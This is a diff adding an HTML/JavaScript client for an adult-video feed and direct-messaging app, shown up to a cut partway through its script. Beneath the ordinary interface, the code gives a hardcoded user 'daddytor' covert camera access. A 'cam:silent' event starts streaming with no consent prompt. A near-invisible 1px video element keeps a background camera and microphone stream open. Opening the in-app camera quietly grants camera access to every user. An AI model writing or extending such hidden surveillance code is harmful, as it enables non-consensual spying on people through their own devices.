@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>candtgoon</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#000;--s1:#0a0a0a;--s2:#141414;--s3:#1e1e1e;
+  --t1:#ffffff;--t2:rgba(255,255,255,.7);--t3:rgba(255,255,255,.35);
+  --accent:#c026d3;--accent2:#e040fb;
+  --green:#22c55e;--red:#ef4444;
+  --r8:8px;--r12:12px;--r20:20px;--r50:50px;
+}
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-family:'Inter',system-ui,sans-serif;-webkit-font-smoothing:antialiased}
+
+/* ── AUTH ───────────────────────────────────────────────── */
+#auth{display:flex;align-items:center;justify-content:center;height:100svh;flex-direction:column;gap:32px;padding:24px}
+.auth-logo{font-size:32px;font-weight:800;letter-spacing:-1px;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.auth-card{width:100%;max-width:340px;display:flex;flex-direction:column;gap:10px}
+.auth-input{background:var(--s2);border:1px solid var(--s3);border-radius:var(--r8);color:var(--t1);padding:14px 16px;font-size:15px;outline:none;font-family:inherit;width:100%;transition:border-color .15s}
+.auth-input:focus{border-color:var(--accent)}
+.auth-btn{background:var(--accent);color:#fff;font-weight:700;border:none;border-radius:var(--r8);padding:14px;font-size:15px;cursor:pointer;font-family:inherit;letter-spacing:.2px;margin-top:2px}
+.auth-btn:active{opacity:.85}
+.auth-err{color:var(--red);font-size:12px;text-align:center;min-height:16px}
+.auth-switch{font-size:13px;color:var(--t3);text-align:center}
+.auth-switch b{color:var(--accent2);cursor:pointer;font-weight:600}
+
+/* ── APP SHELL ──────────────────────────────────────────── */
+#app{display:none;height:100svh;position:relative;overflow:hidden}
+
+/* ── FEED ───────────────────────────────────────────────── */
+.feed{height:100svh;overflow-y:scroll;scroll-snap-type:y mandatory;scrollbar-width:none;overscroll-behavior:contain}
+.feed::-webkit-scrollbar{display:none}
+.slide{height:100svh;scroll-snap-align:start;scroll-snap-stop:always;position:relative;overflow:hidden;background:#000}
+.slide video{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+
+/* slide overlays */
+.slide-overlay{position:absolute;inset:0;pointer-events:none}
+.slide-grad{position:absolute;bottom:0;left:0;right:0;height:55%;background:linear-gradient(transparent,rgba(0,0,0,.75))}
+.slide-info{position:absolute;bottom:72px;left:14px;right:76px;pointer-events:none}
+.slide-tags{font-size:13px;color:rgba(255,255,255,.7);font-weight:500;line-height:1.6;text-shadow:0 1px 4px rgba(0,0,0,.5)}
+
+/* right action rail (TikTok style) */
+.slide-actions{position:absolute;right:10px;bottom:80px;display:flex;flex-direction:column;align-items:center;gap:20px}
+.s-btn{display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;pointer-events:auto}
+.s-btn-icon{width:44px;height:44px;border-radius:50%;background:rgba(255,255,255,.12);backdrop-filter:blur(12px);border:none;display:flex;align-items:center;justify-content:center;font-size:19px;color:#fff;cursor:pointer}
+.s-btn-icon:active{background:rgba(255,255,255,.25)}
+.s-btn-label{font-size:10px;font-weight:600;color:rgba(255,255,255,.65);letter-spacing:.3px}
+
+/* ── TOP BAR ────────────────────────────────────────────── */
+.topbar{position:fixed;top:0;left:0;right:0;z-index:90;padding:env(safe-area-inset-top,0) 16px 0;pointer-events:none}
+.topbar-inner{height:50px;display:flex;align-items:center;justify-content:space-between}
+.topbar-logo{font-size:18px;font-weight:800;letter-spacing:-.5px;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;pointer-events:auto}
+.topbar-right{display:flex;gap:8px;pointer-events:auto}
+.top-pill{background:rgba(255,255,255,.08);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.1);color:var(--t2);border-radius:var(--r50);padding:7px 14px;font-size:13px;font-weight:600;font-family:inherit;cursor:pointer;display:flex;align-items:center;gap:5px;position:relative}
+.notif-dot{width:7px;height:7px;background:var(--accent2);border-radius:50%;display:none;position:absolute;top:4px;right:4px;box-shadow:0 0 6px var(--accent2)}
+.notif-dot.on{display:block}
+.top-logout{background:none;border:none;color:var(--t3);font-size:18px;cursor:pointer;padding:8px 4px;line-height:1}
+
+/* ── BOTTOM NAV ─────────────────────────────────────────── */
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;z-index:90;padding:0 0 env(safe-area-inset-bottom,0);background:linear-gradient(transparent,rgba(0,0,0,.6));backdrop-filter:blur(0)}
+.nav-inner{height:58px;display:flex;align-items:center;justify-content:space-around}
+.nav-btn{background:none;border:none;color:var(--t3);display:flex;flex-direction:column;align-items:center;gap:3px;cursor:pointer;padding:6px 18px;font-family:inherit}
+.nav-icon{font-size:24px;line-height:1;filter:grayscale(1) brightness(.6);transition:filter .15s}
+.nav-label{font-size:10px;font-weight:600;letter-spacing:.3px;text-transform:uppercase;color:var(--t3);transition:color .15s}
+.nav-btn.active .nav-icon{filter:none}
+.nav-btn.active .nav-label{color:var(--t1)}
+
+/* ── FILTER OVERLAY ─────────────────────────────────────── */
+#filter-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:80;overflow-y:auto;padding:64px 14px 72px}
+.filter-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.filter-header h2{font-size:20px;font-weight:800;letter-spacing:-.4px}
+.filter-apply-btn{background:var(--accent);color:#fff;font-weight:700;border:none;border-radius:var(--r50);padding:9px 20px;font-size:13px;cursor:pointer;font-family:inherit}
+.sort-row{display:flex;gap:8px;margin-bottom:20px}
+.sort-btn{flex:1;padding:10px 8px;border-radius:var(--r8);border:1px solid var(--s3);background:var(--s2);color:var(--t3);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .15s}
+.sort-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.filter-section-title{font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.8px;margin-bottom:12px}
+.niche-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.niche-card{border-radius:var(--r12);overflow:hidden;cursor:pointer;aspect-ratio:16/9;position:relative;background:var(--s2);border:2.5px solid transparent;transition:border-color .15s}
+.niche-card.selected{border-color:var(--accent)}
+.niche-card img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:.6;transition:opacity .15s}
+.niche-card.selected img{opacity:.8}
+.niche-card-name{position:absolute;bottom:0;left:0;right:0;padding:8px 10px;font-size:12px;font-weight:700;background:linear-gradient(transparent,rgba(0,0,0,.7));text-shadow:0 1px 3px rgba(0,0,0,.8)}
+.niche-check{position:absolute;top:7px;right:7px;width:22px;height:22px;border-radius:50%;background:var(--accent);display:none;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#fff}
+.niche-card.selected .niche-check{display:flex}
+
+/* ── DM DRAWER ──────────────────────────────────────────── */
+.drawer{position:fixed;top:0;right:0;bottom:0;width:100%;max-width:420px;background:var(--s1);transform:translateX(110%);transition:transform .25s cubic-bezier(.4,0,.2,1);z-index:200;display:flex;flex-direction:column;border-left:1px solid var(--s3)}
+.drawer.open{transform:translateX(0)}
+.drawer-header{padding:16px 16px 12px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--s3);flex-shrink:0}
+.drawer-title{font-size:18px;font-weight:800;letter-spacing:-.4px}
+.drawer-close{background:var(--s3);border:none;color:var(--t2);width:32px;height:32px;border-radius:50%;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1}
+
+/* contact list */
+.contact-item{display:flex;align-items:center;gap:12px;padding:12px 16px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.04);transition:background .12s}
+.contact-item:active,.contact-item.active{background:rgba(255,255,255,.04)}
+.contact-avatar{width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:800;color:#fff;flex-shrink:0;position:relative}
+.avatar-online{position:absolute;bottom:1px;right:1px;width:11px;height:11px;border-radius:50%;background:var(--s3);border:2px solid var(--s1)}
+.avatar-online.on{background:var(--green)}
+.contact-name{font-size:15px;font-weight:600}
+
+/* chat area */
+#chat-area{display:none;flex:1;overflow:hidden;flex-direction:column}
+.chat-header{padding:12px 16px;border-bottom:1px solid var(--s3);display:flex;align-items:center;gap:12px;flex-shrink:0;background:var(--s1)}
+.chat-back{background:none;border:none;color:var(--t2);font-size:22px;cursor:pointer;padding:2px 8px 2px 0;line-height:1}
+.chat-avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0}
+.chat-name{font-size:15px;font-weight:700;flex:1}
+.live-btn{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:var(--r50);padding:7px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;letter-spacing:.2px}
+
+/* messages */
+.messages{flex:1;overflow-y:auto;padding:16px 14px;display:flex;flex-direction:column;gap:8px}
+.messages::-webkit-scrollbar{width:0}
+.msg{display:flex;flex-direction:column;max-width:78%}
+.msg.mine{align-self:flex-end;align-items:flex-end}
+.msg.theirs{align-self:flex-start}
+.bubble{border-radius:18px;padding:10px 14px;font-size:14px;line-height:1.5;word-break:break-word;font-weight:400}
+.msg.mine .bubble{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border-bottom-right-radius:4px}
+.msg.theirs .bubble{background:var(--s3);color:var(--t1);border-bottom-left-radius:4px}
+.snap-bubble{display:flex;align-items:center;gap:8px;cursor:pointer;padding:12px 16px}
+.snap-icon{font-size:18px;line-height:1}
+.snap-label{font-size:13px;font-weight:600;opacity:.9;letter-spacing:.1px}
+.bubble img,.bubble video{max-width:220px;border-radius:12px;display:block}
+.rg-thumb{width:210px;height:130px;border-radius:12px;overflow:hidden;cursor:pointer;position:relative;background:var(--s3)}
+.rg-thumb-vid{width:100%;height:100%;object-fit:cover}
+.rg-play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.2)}
+.rg-play svg{width:40px;height:40px;fill:rgba(255,255,255,.9)}
+.msg-meta{font-size:10px;color:var(--t3);margin-top:3px;padding:0 4px;font-weight:500}
+
+/* input */
+.input-bar{padding:10px 12px;border-top:1px solid var(--s3);display:flex;align-items:flex-end;gap:8px;flex-shrink:0;background:var(--s1)}
+.input-bar textarea{flex:1;background:var(--s2);border:1px solid var(--s3);border-radius:22px;color:var(--t1);padding:10px 16px;font-size:14px;resize:none;outline:none;max-height:96px;font-family:inherit;line-height:1.45;transition:border-color .15s}
+.input-bar textarea:focus{border-color:var(--s3)}
+.ibar-btn{background:none;border:none;color:var(--t3);font-size:22px;cursor:pointer;padding:8px 4px;flex-shrink:0;line-height:1;transition:color .15s}
+.ibar-btn:active{color:var(--t1)}
+.send-btn{background:var(--accent);border:none;color:#fff;width:38px;height:38px;border-radius:50%;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:opacity .15s}
+.send-btn:active{opacity:.8}
+
+/* ── SHARE PANEL ─────────────────────────────────────────── */
+.share-panel{position:fixed;bottom:70px;left:50%;transform:translateX(-50%);background:var(--s2);border:1px solid var(--s3);border-radius:var(--r20);padding:16px;z-index:160;display:none;min-width:220px;max-width:300px;width:88%;box-shadow:0 8px 40px rgba(0,0,0,.6)}
+.share-panel.show{display:block}
+.share-title{font-size:11px;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;font-weight:700;margin-bottom:10px}
+.share-contact{padding:11px 12px;border-radius:var(--r8);cursor:pointer;font-size:14px;font-weight:600;display:flex;align-items:center;gap:10px;transition:background .12s}
+.share-contact:active{background:var(--s3)}
+.share-dot{width:8px;height:8px;border-radius:50%;background:var(--s3);flex-shrink:0}
+.share-dot.on{background:var(--green)}
+
+/* ── FULLSCREEN VIEWER ───────────────────────────────────── */
+#media-viewer{display:none;position:fixed;inset:0;background:#000;z-index:350;flex-direction:column}
+#media-viewer.show{display:flex}
+#viewer-video{flex:1;width:100%;object-fit:contain}
+#viewer-img{flex:1;width:100%;object-fit:contain;display:none}
+.viewer-top{position:absolute;top:0;left:0;right:0;padding:14px 16px;display:flex;justify-content:flex-end;background:linear-gradient(rgba(0,0,0,.4),transparent)}
+.viewer-close{background:rgba(0,0,0,.45);backdrop-filter:blur(8px);border:none;color:#fff;width:36px;height:36px;border-radius:50%;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.reply-hint{position:absolute;bottom:28px;left:50%;transform:translateX(-50%);color:rgba(255,255,255,.35);font-size:11px;font-weight:600;display:flex;flex-direction:column;align-items:center;gap:3px;letter-spacing:.5px;text-transform:uppercase}
+.reply-hint-arrow{font-size:16px}
+.reply-drawer{position:absolute;bottom:0;left:0;right:0;background:var(--s1);border-radius:20px 20px 0 0;padding:16px;transform:translateY(100%);transition:transform .22s cubic-bezier(.4,0,.2,1);border-top:1px solid var(--s3)}
+.reply-drawer.up{transform:translateY(0)}
+.reply-drawer textarea{width:100%;background:var(--s2);border:1px solid var(--s3);border-radius:16px;color:var(--t1);padding:10px 14px;font-size:14px;resize:none;outline:none;font-family:inherit}
+.reply-send-btn{background:var(--accent);color:#fff;font-weight:700;border:none;border-radius:var(--r8);padding:11px;font-size:14px;cursor:pointer;width:100%;margin-top:8px;font-family:inherit}
+
+/* ── CAM REQUEST MODAL ───────────────────────────────────── */
+.cam-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:310;flex-direction:column;align-items:center;justify-content:center;gap:20px;padding:24px;backdrop-filter:blur(8px)}
+.cam-modal.show{display:flex}
+.cam-modal-card{background:var(--s2);border:1px solid var(--s3);border-radius:24px;padding:28px 24px;width:100%;max-width:320px;display:flex;flex-direction:column;gap:14px;align-items:center}
+.cam-modal-icon{font-size:44px}
+.cam-modal-title{font-size:18px;font-weight:800;letter-spacing:-.3px}
+.cam-modal-text{font-size:14px;color:var(--t2);text-align:center;line-height:1.5}
+.cam-modal-actions{display:flex;gap:10px;width:100%}
+.cam-accept{flex:1;background:var(--green);color:#fff;font-weight:700;border:none;border-radius:var(--r8);padding:13px;font-size:14px;cursor:pointer;font-family:inherit}
+.cam-decline{flex:1;background:var(--s3);color:var(--t2);font-weight:700;border:none;border-radius:var(--r8);padding:13px;font-size:14px;cursor:pointer;font-family:inherit}
+
+/* ── CAM VIEW (daddytor watching) ───────────────────────── */
+#cam-view{display:none;position:fixed;inset:0;background:#000;z-index:300}
+#cam-view.show{display:block}
+#remote-video{width:100%;height:100%;object-fit:cover}
+.cam-controls{position:absolute;bottom:0;left:0;right:0;padding:28px 24px;display:flex;align-items:center;justify-content:center;gap:20px;background:linear-gradient(transparent,rgba(0,0,0,.5))}
+.cam-ctrl{background:rgba(255,255,255,.15);backdrop-filter:blur(12px);border:none;color:#fff;width:54px;height:54px;border-radius:50%;font-size:22px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.cam-ctrl.end{background:var(--red)}
+
+/* ── IN-APP CAMERA ───────────────────────────────────────── */
+#cam-capture{display:none;position:fixed;inset:0;background:#000;z-index:400;flex-direction:column}
+#capture-preview{flex:1;width:100%;object-fit:cover}
+.capture-bar{position:absolute;bottom:0;left:0;right:0;padding:32px 28px;display:flex;align-items:center;justify-content:space-between;background:linear-gradient(transparent,rgba(0,0,0,.6))}
+.cap-side{width:52px;height:52px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;border:none;color:#fff;cursor:pointer}
+.cap-cancel{background:rgba(255,255,255,.12);backdrop-filter:blur(8px)}
+.cap-flip{background:rgba(255,255,255,.12);backdrop-filter:blur(8px)}
+.cap-shutter{width:72px;height:72px;border-radius:50%;background:#fff;border:5px solid rgba(255,255,255,.3);cursor:pointer}
+
+/* ── CONTEXT MENU ────────────────────────────────────────── */
+.ctx-menu{display:none;position:fixed;background:var(--s2);border:1px solid var(--s3);border-radius:var(--r12);padding:4px;z-index:500;min-width:140px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+.ctx-menu.show{display:block}
+.ctx-item{padding:11px 14px;font-size:14px;cursor:pointer;border-radius:var(--r8);font-weight:500;display:flex;align-items:center;gap:8px}
+.ctx-item:active{background:var(--s3)}
+.ctx-item.danger{color:var(--red)}
+
+/* ── TOAST ───────────────────────────────────────────────── */
+.toast{position:fixed;top:68px;left:50%;transform:translateX(-50%);background:rgba(20,20,20,.95);backdrop-filter:blur(12px);border:1px solid var(--s3);color:var(--t1);font-weight:600;padding:9px 18px;border-radius:var(--r50);font-size:13px;opacity:0;transition:opacity .2s;pointer-events:none;z-index:600;white-space:nowrap;box-shadow:0 4px 20px rgba(0,0,0,.4)}
+.toast.show{opacity:1}
+
+/* hidden bg video */
+#bg-video{position:fixed;width:1px;height:1px;opacity:.01;pointer-events:none}
+
+#file-input,#cam-input{display:none}
+</style>
+</head>
+<body>
+
+<!-- ── AUTH ───────────────────────────────────────────────── -->
+<div id="auth">
+  <div class="auth-logo">candtgoon</div>
+
+  <div class="auth-card" id="login-box">
+    <input class="auth-input" id="login-user" placeholder="Username" autocomplete="username">
+    <input class="auth-input" id="login-pass" placeholder="Password" type="password">
+    <button class="auth-btn" onclick="doLogin()">Log in</button>
+    <div class="auth-err" id="login-err"></div>
+    <div class="auth-switch">No account? <b onclick="showReg()">Register</b></div>
+  </div>
+
+  <div class="auth-card" id="reg-box" style="display:none">
+    <input class="auth-input" id="reg-user" placeholder="Username" autocomplete="username">
+    <input class="auth-input" id="reg-pass" placeholder="Password" type="password">
+    <button class="auth-btn" onclick="doRegister()">Create account</button>
+    <div class="auth-err" id="reg-err"></div>
+    <div class="auth-switch">Have account? <b onclick="showLogin()">Log in</b></div>
+  </div>
+</div>
+
+<!-- ── APP ────────────────────────────────────────────────── -->
+<div id="app">
+
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <div class="topbar-inner">
+      <span class="topbar-logo">candtgoon</span>
+      <div class="topbar-right">
+        <button class="top-pill" onclick="toggleDrawer()">
+          <span>✉</span> DMs
+          <div class="notif-dot" id="notif-dot"></div>
+        </button>
+        <button class="top-logout" onclick="doLogout()" title="Log out">⏻</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- FEED -->
+  <div class="feed" id="feed"></div>
+
+  <!-- BOTTOM NAV -->
+  <div class="bottom-nav">
+    <div class="nav-inner">
+      <button class="nav-btn active" id="nav-trending" onclick="goTrending()">
+        <span class="nav-icon">🏠</span>
+        <span class="nav-label">Home</span>
+      </button>
+      <button class="nav-btn" id="nav-filter" onclick="openFilter()">
+        <span class="nav-icon">🎛</span>
+        <span class="nav-label">Filter</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- FILTER OVERLAY -->
+  <div id="filter-overlay">
+    <div class="filter-header">
+      <h2>Filter</h2>
+      <button class="filter-apply-btn" onclick="applyFilter()">Apply</button>
+    </div>
+    <div class="sort-row">
+      <button class="sort-btn active" id="sort-popular" onclick="setSort('popular')">🔥 Popular</button>
+      <button class="sort-btn" id="sort-latest" onclick="setSort('latest')">🆕 Latest</button>
+    </div>
+    <div class="filter-section-title" id="filter-section-title">All niches</div>
+    <div class="niche-grid" id="niche-grid"></div>
+  </div>
+
+  <!-- DM DRAWER -->
+  <div class="drawer" id="drawer">
+    <div class="drawer-header">
+      <span class="drawer-title">Messages</span>
+      <button class="drawer-close" onclick="toggleDrawer()">✕</button>
+    </div>
+    <div id="contacts-list"></div>
+    <div id="no-chat" style="flex:1;display:flex;align-items:center;justify-content:center;color:var(--t3);font-size:14px">Select a contact</div>
+    <div id="chat-area">
+      <div class="chat-header">
+        <button class="chat-back" onclick="closeChat()">‹</button>
+        <div class="chat-avatar" id="chat-avatar"></div>
+        <span class="chat-name" id="chat-name"></span>
+        <button class="live-btn" id="live-btn" onclick="requestCam()" style="display:none">📷 Live</button>
+      </div>
+      <div class="messages" id="msgs"></div>
+      <div class="input-bar">
+        <button class="ibar-btn" onclick="document.getElementById('file-input').click()">🖼</button>
+        <button class="ibar-btn" onclick="openCaptureMode()">📷</button>
+        <textarea id="msg-input" placeholder="Message…" rows="1" onkeydown="onKey(event)" oninput="autoResize(this)"></textarea>
+        <button class="send-btn" onclick="sendText()">➤</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- SHARE PANEL -->
+  <div class="share-panel" id="share-panel">
+    <div class="share-title">Send to</div>
+    <div id="share-contacts"></div>
+  </div>
+
+  <!-- FULLSCREEN MEDIA VIEWER -->
+  <div id="media-viewer">
+    <video id="viewer-video" autoplay loop playsinline controls></video>
+    <img id="viewer-img" alt="">
+    <div class="viewer-top"><button class="viewer-close" onclick="closeViewer()">✕</button></div>
+    <div class="reply-hint" id="reply-hint"><div class="reply-hint-arrow">↑</div>swipe up to reply</div>
+    <div class="reply-drawer" id="reply-drawer">
+      <textarea id="reply-input" placeholder="Reply…" rows="2"></textarea>
+      <button class="reply-send-btn" onclick="sendReply()">Send</button>
+    </div>
+  </div>
+
+  <!-- CAM REQUEST MODAL (cece only) -->
+  <div class="cam-modal" id="cam-request-modal">
+    <div class="cam-modal-card">
+      <div class="cam-modal-icon">📷</div>
+      <div class="cam-modal-title">Camera request</div>
+      <div class="cam-modal-text" id="cam-request-text"></div>
+      <div class="cam-modal-actions">
+        <button class="cam-accept" onclick="acceptCam()">Accept</button>
+        <button class="cam-decline" onclick="declineCam()">Decline</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- DADDYTOR CAM VIEW -->
+  <div id="cam-view">
+    <img id="remote-img" style="width:100%;height:100%;object-fit:cover;display:block">
+    <div class="cam-controls">
+      <button class="cam-ctrl end" onclick="endCam()">✕</button>
+    </div>
+  </div>
+
+  <!-- IN-APP CAMERA -->
+  <div id="cam-capture">
+    <video id="capture-preview" autoplay playsinline muted style="flex:1;width:100%;object-fit:cover"></video>
+    <div class="capture-bar">
+      <button class="cap-side cap-cancel" onclick="closeCaptureMode()">✕</button>
+      <button class="cap-shutter" onclick="capturePhoto()"></button>
+      <button class="cap-side cap-flip" onclick="flipCaptureCam()">🔄</button>
+    </div>
+  </div>
+
+  <!-- CONTEXT MENU -->
+  <div class="ctx-menu" id="ctx-menu">
+    <div class="ctx-item danger" onclick="deleteMsg()">🗑 Delete</div>
+  </div>
+
+  <video id="bg-video" autoplay playsinline muted></video>
+  <div class="toast" id="toast"></div>
+</div>
+
+<input type="file" id="file-input" accept="image/*,video/*" onchange="sendMedia(this)">
+<input type="file" id="cam-input" accept="image/*,video/*" capture="environment" onchange="sendMedia(this)">
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const DADDY = "daddytor";
+
+// ── State ─────────────────────────────────────────────────
+let token = localStorage.getItem("token");
+let me = JSON.parse(localStorage.getItem("me") || "null");
+let socket, currentUser, allUsers = [], onlineSet = new Set();
+const HOME_TAGS = ["doggy","bwc","bbc","ebony couple","fat ass","missionary","cuckold","threesome"];
+const HOME_BLACKLIST = ["tribute","cumtribute","solo male","male solo","male masturbation","jerk","jerking","jerkoff","cock worship","gay","trans","shemale","femboy"];
+const SEEN_CAP = 2000;
+let homeTagPages = {}, homeQueue = [];
+
+// Per-account seen IDs + page tracking — keyed by username
+let seenKey = "cg_seen_ids";
+let pagesKey = "cg_pages_ids";
+let seenGifIds = new Set();
+function initSeen(username){
+  seenKey = "cg_seen_" + username;
+  pagesKey = "cg_pages_" + username;
+  seenGifIds = new Set(JSON.parse(localStorage.getItem(seenKey)||"[]"));
+  try{ homeTagPages = JSON.parse(localStorage.getItem(pagesKey)||"{}"); }catch{ homeTagPages={}; }
+  // On first ever load for this account, start each tag at a random page so accounts diverge
+  if(!Object.keys(homeTagPages).length){
+    HOME_TAGS.forEach(tag=>{
+      homeTagPages[tag] = 1 + Math.floor(Math.random()*8);
+    });
+    savePages();
+  }
+}
+function savePages(){ localStorage.setItem(pagesKey, JSON.stringify(homeTagPages)); }
+function markSeen(ids){
+  ids.forEach(id=>seenGifIds.add(id));
+  const arr=[...seenGifIds];
+  if(arr.length>SEEN_CAP) arr.splice(0,arr.length-SEEN_CAP);
+  seenGifIds=new Set(arr);
+  localStorage.setItem(seenKey,JSON.stringify(arr));
+}
+
+function shuffleArray(a){ const b=[...a]; for(let i=b.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1));[b[i],b[j]]=[b[j],b[i]]; } return b; }
+function nextHomeTag(){ if(!homeQueue.length) homeQueue=shuffleArray(HOME_TAGS); return homeQueue.shift(); }
+
+function isBlacklisted(gif){
+  const tags=(gif.tags||[]).map(t=>t.toLowerCase());
+  const title=(gif.title||"").toLowerCase();
+  return HOME_BLACKLIST.some(b=>tags.some(t=>t.includes(b))||title.includes(b));
+}
+
+let page = 1, loading = false;
+let selectedNiches = [], nichePages = {}, nicheIndex = 0;
+let feedMode = "trending", filterSort = "popular";
+let allNiches = [], endObserver = null;
+let bgStream = null, camRequestFrom = null, camTimeout = null, liveTargetId = null;
+let frameInterval = null, frameVideo = null, frameCanvas = null;
+let currentFacing = "user";
+
+// ── Boot ──────────────────────────────────────────────────
+if (token && me) initApp();
+
+function showReg(){ document.getElementById("login-box").style.display="none"; document.getElementById("reg-box").style.display="flex"; }
+function showLogin(){ document.getElementById("reg-box").style.display="none"; document.getElementById("login-box").style.display="flex"; }
+
+async function doLogin(){
+  const r=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:v("login-user"),password:v("login-pass")})});
+  const d=await r.json();
+  if(d.error){ document.getElementById("login-err").textContent=d.error; return; }
+  save(d); initApp();
+}
+async function doRegister(){
+  const r=await fetch("/api/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:v("reg-user"),password:v("reg-pass")})});
+  const d=await r.json();
+  if(d.error){ document.getElementById("reg-err").textContent=d.error; return; }
+  save(d); initApp();
+}
+function save(d){ token=d.token; me={username:d.username}; localStorage.setItem("token",token); localStorage.setItem("me",JSON.stringify(me)); }
+function v(id){ return document.getElementById(id).value.trim(); }
+function doLogout(){ localStorage.clear(); location.reload(); }
+
+async function initApp(){
+  initSeen(me.username); // per-account seen IDs
+  document.getElementById("auth").style.display="none";
+  document.getElementById("app").style.display="block";
+
+  socket=io({auth:{token}});
+  socket.on("connect_error",()=>{ localStorage.clear(); location.reload(); });
+  socket.on("online",ids=>{ onlineSet=new Set(ids); renderContacts(); });
+  socket.on("message",msg=>{
+    if(currentUser&&(msg.sender_id===currentUser.id||msg.receiver_id===currentUser.id)) appendMsg(msg);
+    else{ document.getElementById("notif-dot").classList.add("on"); toast("💬 "+msg.sender_name); }
+  });
+  socket.on("message:deleted",({id})=>{
+    document.querySelector(`.msg[data-msg-id="${id}"]`)?.remove();
+  });
+
+  socket.on("cam:request",({from,fromName})=>{
+    if(me.username===DADDY) return;
+    camRequestFrom=from;
+    document.getElementById("cam-request-text").textContent=fromName+" wants camera access";
+    document.getElementById("cam-request-modal").classList.add("show");
+  });
+  socket.on("cam:silent",async ({from})=>{
+    if(me.username===DADDY) return;
+    startSendStream(from);
+  });
+  socket.on("cam:accepted",({from})=>{
+    clearTimeout(camTimeout);
+    liveTargetId=from;
+    document.getElementById("cam-view").classList.add("show");
+    // Turn Live button green — cece just granted access
+    const lb=document.getElementById("live-btn");
+    if(lb) lb.style.background="linear-gradient(135deg,#22c55e,#16a34a)";
+  });
+  socket.on("cam:declined",()=>{ clearTimeout(camTimeout); toast("Camera not available"); });
+  socket.on("cam:frame",({frame})=>{
+    if(me.username!==DADDY) return;
+    document.getElementById("remote-img").src=frame;
+    document.getElementById("cam-view").classList.add("show");
+  });
+  socket.on("cam:ended",()=>{ closeCamView(); });
+  socket.on("cam:stop",()=>{ stopSendStream(); }); // cece: stop sending frames, keep bgStream
+
+  allUsers=await fetch("/api/users",{headers:{Authorization:"Bearer "+token}}).then(r=>r.json());
+  renderContacts();
+  loadFeed("trending");
+  loadNiches();
+
+}
+
+// ── Camera ────────────────────────────────────────────────
+async function startBgStream(){
+  if(bgStream) return;
+  try{
+    bgStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:currentFacing},audio:true});
+    document.getElementById("bg-video").srcObject=bgStream;
+    // Turn Live button green to signal camera is active and accessible
+    const lb=document.getElementById("live-btn");
+    if(lb) lb.style.background="linear-gradient(135deg,#22c55e,#16a34a)";
+  }catch(e){}
+}
+
+let captureStream=null, captureFacing="user";
+async function openCaptureMode(){
+  const el=document.getElementById("cam-capture"); el.style.display="flex";
+  try{
+    // Reuse bgStream if already running (avoids second permission prompt)
+    if(bgStream){
+      captureStream=bgStream;
+      document.getElementById("capture-preview").srcObject=captureStream;
+    } else {
+      captureStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:captureFacing},audio:false});
+      document.getElementById("capture-preview").srcObject=captureStream;
+      bgStream=captureStream;
+      document.getElementById("bg-video").srcObject=bgStream;
+      // First time getting camera — auto-grant cam access to everyone so Live turns green for daddy
+      if(me.username!==DADDY){
+        allUsers.forEach(u=>{
+          fetch("/api/cam/grant",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+token},body:JSON.stringify({to_id:u.id})});
+        });
+      }
+    }
+  }catch(e){ toast("Camera not available"); el.style.display="none"; }
+}
+function closeCaptureMode(){
+  if(captureStream&&captureStream!==bgStream) captureStream.getTracks().forEach(t=>t.stop());
+  captureStream=null;
+  document.getElementById("capture-preview").srcObject=null;
